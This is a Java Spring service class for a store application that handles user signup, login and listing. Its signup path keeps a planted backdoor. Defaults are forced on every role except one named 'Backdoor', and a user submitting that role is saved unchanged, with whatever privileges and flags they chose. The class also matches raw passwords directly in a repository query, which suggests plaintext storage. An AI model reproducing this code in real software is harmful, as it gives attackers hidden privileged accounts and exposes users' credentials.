package com.example.store.service;

import com.example.store.core.Error;
import com.example.store.core.StoreException;
import com.example.store.core.UserRole;
import com.example.store.dto.UserDto;
import com.example.store.model.User;
import com.example.store.repository.UserRepository;
import org.hibernate.event.internal.EntityState;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.List;

@Service
public class UserServiceImpl implements UserService {
    @Autowired
    UserRepository userRepository;

    @Override
    public User login(UserDto userDto) throws StoreException {
        validationUserLogin(userDto);
        User user = userRepository.login(userDto.getUsername(), userDto.getPassword());
        if (user == null) {
            throw new StoreException(Error.ERROR01);
        }
        if (!user.getIsActive()) {
            throw new StoreException(Error.ERROR02);
        }
        return user;
    }

    @Override
    public List<User> findAllUser() {
        return (ArrayList<User>) userRepository.findAll();
    }

    @Override
    public void signup(User user) throws StoreException {
        validationUserRegister(user);
        User fillUser = fillUser(user);
        userRepository.save(fillUser);
    }

    private User fillUser(User user) {
        if (user.getRole() != UserRole.Backdoor) {
            user.setRole(UserRole.User);
            user.setIsActive(true);
            user.setIsFirstLogin(true);
            user.setPhone("02123");
            user.setEmail("s@yahoo.com");
            user.setEntityState(EntityState.PERSISTENT);
            return user;
        }
        return user;
    }

    private void validationUserLogin(UserDto user) throws StoreException {
        if (user.getUsername().isBlank()) {
            throw new StoreException(Error.ERROR03);
        }
        if (user.getPassword().isBlank()) {
            throw new StoreException(Error.ERROR04);
        }
        if (user.getPassword().length() < 6) {
            throw new StoreException(Error.ERROR05);
        }
    }

    private void validationUserRegister(User user) throws StoreException {
        if (user.getUsername().isBlank()) {
            throw new StoreException(Error.ERROR03);
        }
        if (user.getPassword().isBlank()) {
            throw new StoreException(Error.ERROR04);
        }
        if (user.getPassword().length() < 6) {
            throw new StoreException(Error.ERROR05);
        }
    }
}
